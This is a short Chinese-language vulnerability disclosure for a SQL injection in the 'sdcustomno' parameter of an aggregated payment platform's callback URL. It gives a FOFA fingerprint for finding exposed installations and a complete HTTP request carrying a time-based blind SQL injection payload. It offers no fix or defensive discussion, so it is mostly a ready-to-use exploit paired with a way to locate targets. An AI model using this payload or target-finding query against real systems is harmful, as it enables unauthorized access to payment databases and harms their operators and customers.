# 聚合支付平台接口sdcustomno存在SQL注入漏洞

聚合支付平台接口sdcustomno存在SQL注入漏洞

## fofa

```javascript
"/Public/theme/view4/css/style.css"
```

## poc

```javascript
GET /pay_UPALIWAP_callbackurl?sdcustomno=*%27)%20AND%20(SELECT%202655%20FROM%20(SELECT(SLEEP(5)))DNPm)%20AND%20(%27RWpf%27=%27RWpf HTTP/1.1
Host: 127.0.0.1                                                                                          
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
```

![image-20241107115047722](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411071150773.png)